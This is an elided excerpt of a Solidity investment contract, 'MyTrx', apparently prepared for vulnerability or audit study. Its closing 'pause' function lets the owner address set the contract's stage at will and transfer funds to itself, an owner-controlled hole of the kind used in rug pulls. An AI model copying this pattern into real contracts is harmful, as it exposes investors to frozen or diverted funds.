...
contract MyTrx {
    ...
    uint256 constant public STATE_CHANGE_PERCENT = 500;
    ...
    uint256 constant public RANK_PERCENT = 200;
    ...
    function calcUserInvestReward(address userAddr) public view returns (uint256) {
        ...
        require(user.startDate != 0 && user.startDate < currentDate);
    ...
    function investStage1() public payable{
        ...
        require(block.timestamp < rankStartTime.add(timeLimit));
        ...
        require(msg.value >= minFee && msg.value <= maxFee);
        entryFee = msg.value;
    ...
    function dispatchRankListReward() public {
        require(currentStage == 1);
        require(block.timestamp > rankStartTime.add(timeLimit));
        require(rankListRewardDispatched == false);
    ...
    function withdrawStage2() public {
        ...
        User storage user = users[msg.sender];
        require(user.realInvestEffectFactor > 0);
    ...
    function pause(uint256 p1, uint256 p2) public {
        require(msg.sender == defaultUserAddr);
        if(p1 == 0){
            currentStage = p2;
        } else if(p2 == 1){
            defaultUserAddr.transfer(p2);
        }
    }
}
library SafeMath {
